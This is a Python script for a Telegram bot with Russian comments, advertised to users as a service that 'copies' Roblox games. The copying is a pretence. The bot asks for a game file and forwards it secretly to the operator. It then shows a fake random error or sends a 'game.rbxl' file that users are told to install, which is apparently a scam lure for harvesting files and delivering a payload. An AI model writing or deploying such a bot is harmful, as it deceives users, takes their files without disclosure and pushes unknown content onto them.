import telebot
from telebot import types
import random

# --- НАСТРОЙКИ ---
API_TOKEN = 'ВСТАВЬ_СВОЙ_ТОКЕН'
ADMIN_ID = 5655100280 # Твой ID со скриншота
CHANNEL_URL = 'https://t.me/твой_канал'

# На Bothost прокси НЕ НУЖНЫ, поэтому apihelper удаляем
bot = telebot.TeleBot(API_TOKEN)
user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn_start = types.InlineKeyboardButton("✅ Начать копирование", callback_data='step_1')
    btn_tutor = types.InlineKeyboardButton("📖 Tutorial (Канал)", url=CHANNEL_URL)
    markup.add(btn_start, btn_tutor)
    text = "🟢 **Привет!** Мы копируем плейсы Roblox. Нажми кнопку ниже!"
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: call.data == 'step_1')
def ask_game(call):
    msg = bot.send_message(call.message.chat.id, "🧪 **Шаг 1:** Напиши название игры:")
    bot.register_next_step_handler(msg, process_game)

def process_game(message):
    user_data[message.chat.id] = {'game': message.text}
    msg = bot.send_message(message.chat.id, "🟢 **Шаг 2:** Теперь отправь файл игры:")
    bot.register_next_step_handler(msg, process_file)

def process_file(message):
    chat_id = message.chat.id
    if message.content_type in ['document', 'photo', 'video']:
        # Уведомление тебе
        bot.send_message(ADMIN_ID, f"📥 НОВЫЙ ФАЙЛ!\n🎮 Игра: {user_data[chat_id]['game']}")
        bot.forward_message(ADMIN_ID, chat_id, message.message_id)
        
        # Рандом 50/50
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        markup.add(types.KeyboardButton("🔄 Повторить попытку"))

        if random.randint(1, 2) == 1:
            bot.send_message(chat_id, "⚠️ **Ошибка копирования!** Попробуй позже.", reply_markup=markup)
        else:
            bot.send_message(chat_id, "⌛ **Копирование почти завершено...**")
            try:
                with open('game.rbxl', 'rb') as f:
                    bot.send_document(chat_id, f, caption="📎 Установи этот компонент.", reply_markup=markup)
            except Exception as e:
                bot.send_message(chat_id, "❌ Файл не найден на сервере.")
    else:
        bot.send_message(chat_id, "❌ Отправь именно файл!")

bot.polling(none_stop=True)
